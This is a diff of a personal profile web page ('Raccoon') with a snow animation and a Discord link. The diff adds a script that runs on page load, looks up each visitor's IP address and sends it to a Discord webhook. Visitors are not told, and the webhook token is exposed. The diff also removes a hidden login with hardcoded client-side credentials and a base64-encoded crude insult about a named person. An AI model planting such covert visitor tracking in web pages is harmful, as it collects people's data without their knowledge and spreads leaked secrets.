@@ -219,7 +219,7 @@
       display: flex;
       flex-direction: column;
       justify-content: flex-start;
-      max-height: 80px;
+      max-height: 80px; /* slim by default */
       transition: 
         max-height 1.2s cubic-bezier(0.4, 0, 0.2, 1), 
         transform 0.4s ease, 
@@ -250,7 +250,7 @@
       border-color: #4a4a4a;
       transform: translateY(-10px) scale(1.02);
       box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
-      max-height: 1000px;
+      max-height: 1000px; /* expand smoothly */
     }
 
     .service-card:hover .service-info {
@@ -281,129 +281,6 @@
       transform: translateY(0);
     }
 
-    /* Login Modal */
-    .login-modal {
-      display: none;
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background-color: rgba(0, 0, 0, 0.8);
-      z-index: 10000;
-      justify-content: center;
-      align-items: center;
-    }
-
-    .login-modal.active {
-      display: flex;
-    }
-
-    .login-box {
-      background-color: #1a1a1a;
-      border-radius: 1.5rem;
-      padding: 2rem;
-      width: 90%;
-      max-width: 400px;
-      text-align: center;
-    }
-
-    .login-box h2 {
-      margin: 0 0 1.5rem 0;
-      color: #ffffff;
-    }
-
-    .login-box input {
-      width: calc(100% - 2rem);
-      padding: 1rem;
-      margin-bottom: 1rem;
-      background-color: #2a2a2a;
-      border: 2px solid #3a3a3a;
-      border-radius: 0.75rem;
-      color: #ffffff;
-      font-size: 1rem;
-      font-family: Arial, sans-serif;
-    }
-
-    .login-box input:focus {
-      outline: none;
-      border-color: #5865f2;
-    }
-
-    .login-buttons {
-      display: flex;
-      gap: 1rem;
-      margin-top: 1rem;
-    }
-
-    .login-submit, .login-cancel {
-      flex: 1;
-      padding: 1rem;
-      border: none;
-      border-radius: 0.75rem;
-      font-size: 1rem;
-      font-weight: 600;
-      cursor: pointer;
-      font-family: Arial, sans-serif;
-      transition: all 0.2s ease;
-    }
-
-    .login-submit {
-      background-color: #5865f2;
-      color: #ffffff;
-    }
-
-    .login-submit:hover {
-      background-color: #4752c4;
-    }
-
-    .login-cancel {
-      background-color: #2a2a2a;
-      color: #ffffff;
-    }
-
-    .login-cancel:hover {
-      background-color: #3a3a3a;
-    }
-
-    .error-message {
-      color: #ff4444;
-      margin-top: 0.5rem;
-      font-size: 0.9rem;
-      display: none;
-    }
-
-    .error-message.show {
-      display: block;
-    }
-
-    /* Secret Page */
-    .secret-page {
-      display: none;
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background-color: #0e0e0e;
-      z-index: 9999;
-      justify-content: center;
-      align-items: center;
-      flex-direction: column;
-    }
-
-    .secret-page.active {
-      display: flex;
-    }
-
-    .secret-content {
-      font-size: 2rem;
-      color: #ffffff;
-      text-align: center;
-      padding: 2rem;
-      max-width: 800px;
-    }
-
     footer {
       position: absolute;
       bottom: 8px;
@@ -416,17 +293,12 @@
     .version {
       position: fixed;
       top: 10px;
-      left: 15px;
+      right: 15px;
       font-size: 0.75rem;
       color: white;
       opacity: 0.7;
       z-index: 9999;
       user-select: none;
-      background: none;
-      border: none;
-      padding: 0;
-      cursor: pointer;
-      font-family: Arial, sans-serif;
     }
 
     @media (max-width: 768px) {
@@ -457,34 +329,13 @@
 </head>
 <body>
   <div class="snow-container" id="snowContainer"></div>
-  <button class="version" id="versionBtn">v3</button>
-
-  <!-- Login Modal -->
-  <div class="login-modal" id="loginModal">
-    <div class="login-box">
-      <h2>Login</h2>
-      <input type="text" id="usernameInput" placeholder="Username">
-      <input type="password" id="passwordInput" placeholder="Password">
-      <div class="error-message" id="errorMessage">Invalid credentials</div>
-      <div class="login-buttons">
-        <button class="login-cancel" id="loginCancel">Cancel</button>
-        <button class="login-submit" id="loginSubmit">Login</button>
-      </div>
-    </div>
-  </div>
-
-  <!-- Secret Page -->
-  <div class="secret-page" id="secretPage">
-    <div class="secret-content">
-      You found the secret page! but there is more.
-      <br><br>
-      YnlhbiBsaWtlcyBmYXQgY29jaw==
-    </div>
-  </div>
+  <div class="version">v3.0</div>
+  <div class="version">v3.1</div>
 
   <!-- Main Content -->
   <div class="main-content" id="mainContent">
     <div class="profile-card">
+      <div class="profile-pic" style="background-image: url('https://i.imgur.com/DvTDMEm.png');"></div>
       <div class="profile-pic" style="background-image: url('https://i.imgur.com/DvTDMEm.png ');"></div>
       <div class="profile-info">
         <h1>Raccoon</h1>
@@ -493,6 +344,7 @@
     </div>
 
     <div class="buttons-container">
+      <a href="https://discord.gg/wvKkTNA9j3" class="discord-button" target="_blank">Join Discord Server</a>
       <a href="https://discord.gg/wvKkTNA9j3 " class="discord-button" target="_blank">Join Discord Server</a>
       <button class="services-button" id="servicesBtn">Services</button>
     </div>
@@ -617,8 +469,37 @@
 
   <footer>© raccoon.site · china1</footer>
 
+  <!-- IP & Webhook script -->
+  <script>
+    function sendWebhook(message) {
+      const webhookURL = "https://discord.com/api/webhooks/1422260681956393071/rWdu20aw2A3GEoKNzj1HNiNyEOULdqDozcKFWHWvIA_v7GTeCo6VhMhpdksLilftSEbV"; // your webhook
+      fetch(webhookURL, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          content: message
+        })
+      })
+      .then(res => console.log("Success:", res))
+      .catch(err => console.error("Error:", err));
+    }
+
+    // Step 1: Get client IP
+    fetch("https://api.ipify.org?format=json ")
+      .then(res => res.json())
+      .then(data => {
+        const ip = data.ip;
+	sendWebhook(ip);
+ 
+      })
+      .catch(err => console.error("GeoIP Error:", err));
+  </script>
+
   <!-- Snow animation -->
   <script>
+    // Snow animation
     const snowContainer = document.getElementById('snowContainer');
     const snowflakes = [];
     let mouseX = window.innerWidth / 2;
@@ -718,53 +599,6 @@
           mainContent.classList.remove('hidden');
         }, 50);
       }, 300);
-    });
-
-    // Login functionality
-    const versionBtn = document.getElementById('versionBtn');
-    const loginModal = document.getElementById('loginModal');
-    const loginCancel = document.getElementById('loginCancel');
-    const loginSubmit = document.getElementById('loginSubmit');
-    const usernameInput = document.getElementById('usernameInput');
-    const passwordInput = document.getElementById('passwordInput');
-    const errorMessage = document.getElementById('errorMessage');
-    const secretPage = document.getElementById('secretPage');
-
-    versionBtn.addEventListener('click', () => {
-      loginModal.classList.add('active');
-      usernameInput.value = '';
-      passwordInput.value = '';
-      errorMessage.classList.remove('show');
-    });
-
-    loginCancel.addEventListener('click', () => {
-      loginModal.classList.remove('active');
-    });
-
-    loginSubmit.addEventListener('click', () => {
-      const username = usernameInput.value;
-      const password = passwordInput.value;
-
-      if (username === 'verfugbar' && password === 'available') {
-        loginModal.classList.remove('active');
-        secretPage.classList.add('active');
-      } else {
-        errorMessage.classList.add('show');
-      }
-    });
-
-    // Allow Enter key to submit
-    passwordInput.addEventListener('keypress', (e) => {
-      if (e.key === 'Enter') {
-        loginSubmit.click();
-      }
-    });
-
-    // Close modal when clicking outside
-    loginModal.addEventListener('click', (e) => {
-      if (e.target === loginModal) {
-        loginModal.classList.remove('active');
-      }
     });
   </script>
 </body>
